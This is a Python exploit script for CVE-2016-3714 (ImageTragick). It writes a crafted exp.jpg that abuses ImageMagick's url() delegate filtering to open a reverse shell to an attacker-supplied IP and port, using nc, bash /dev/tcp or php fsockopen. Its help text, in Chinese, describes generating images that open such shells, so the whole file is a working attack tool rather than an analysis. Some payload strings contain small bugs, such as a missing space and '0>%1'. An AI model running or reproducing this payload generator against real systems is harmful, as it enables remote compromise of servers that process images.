# -*-coding:utf-8-*-
#！/usr/bin/env python
#imagemagic_exp.py

import argparse

class payload(object):
	"""	building payload,you must input shell typle and server ip and port
	 	CVE-2016-3714 - Insufficient shell characters filtering leads to
		(potentially remote) code execution
 		Insufficient filtering for filename passed to delegate's command allows
		remote code execution during conversion of several file formats
	"""
	def __init__(self, shelltype,ip,port):
		#super(_paload, self).__init__()
		self.shelltype = shelltype
		self.ip = ip
		self.port =port 
		self.nc='nc -e /bin/sh' + self.ip+ ' ' + self.port
		self.bash= 'bash -i >& /dev/tcp/' + self.ip + '/' + self.port +' 0>%1'
		self.php="php -r '$sock=fsockopen(%s,%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"	%(self.ip,self.port)	
		self.shell_dict={
			'nc': self.nc,
			'bash': self.bash,
			'php': self.php

				}
	def payloadbuild(self):
		"""
		push graphic-context
		viewbox 0 0 640 480
		fill 'url(https://example.com/image.jpg"|bash -i >& /dev/tcp/127.0.0.1/2333 0>&1")'
		pop graphic-context
		"""
		if self.shelltype =='nc':
			self.shell =self.shell_dict['nc']
		if self.shelltype=='bash':
			self.shell =self.shell_dict['bash']
		if self.shelltype=='php':
			self.shell =self.shell_dict['php']

		self.shellcode="fill 'url(https://example.com/image.jpg\"|"+self.shell+ " \")\' "
		payload =[]
		payload.append('push graphic-context')
		payload.append('viewbox 0 0 640 480')
		payload.append(self.shellcode)
		payload.append('pop graphic-context')
		return payload
	#touch a jpg image
	def newimage(self):
	   
		with open('exp.jpg', 'w') as file:
			for item in self.payloadbuild():
				file.write(item+'\n')

if __name__=='__main__':
	parse =argparse.ArgumentParser()
	parse.add_argument("--nc",help="生成可执行 nc反射的图片",action="store_true")
	parse.add_argument("--bash",help="生成可执行bash反射的图片",action="store_true")	
	parse.add_argument("--php",help="生成可执行php射的图片",action="store_true")
	parse.add_argument("--ip",help="反弹shell 的 ip",default='127.0.0.1')
	parse.add_argument("--port",help="反弹shell的port",default='8888')
	args=parse.parse_args()
	if args.nc:
		test=payload('nc', args.ip, args.port)
		test.newimage()
	if args.bash:
		test=payload('bash', args.ip, args.port)
		test.newimage()
	if args.php:
		test=payload('php', args.ip, args.port)
		test.newimage()
